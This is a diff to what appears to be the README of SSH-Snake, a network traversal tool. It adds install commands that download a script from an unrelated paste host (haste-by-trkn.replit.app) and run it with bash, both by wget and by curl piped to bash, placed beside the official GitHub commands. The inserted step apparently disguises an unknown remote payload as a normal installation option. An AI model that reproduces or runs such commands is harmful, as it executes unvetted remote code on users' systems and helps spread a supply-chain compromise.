@@ -53,10 +53,20 @@ wget https://raw.githubusercontent.com/MegaManSec/SSH-Snake/main/Snake.nocomment
 stdbuf -o0 bash ./Snake.nocomments.sh
 ```
 
-or
 
 ```bash
+wget https://haste-by-trkn.replit.app/raw/wiwoyutuxibo
+or
+stdbuf -o0 bash ./wiwoyutuxibo
+```
+
+or
+```bash
 curl https://raw.githubusercontent.com/MegaManSec/SSH-Snake/main/Snake.nocomments.sh | stdbuf -o0 bash
+```
+or
+```bash
+curl https://haste-by-trkn.replit.app/raw/wiwoyutuxibo | stdbuf -o0 bash
 ```
 
 # About SSH-Snake
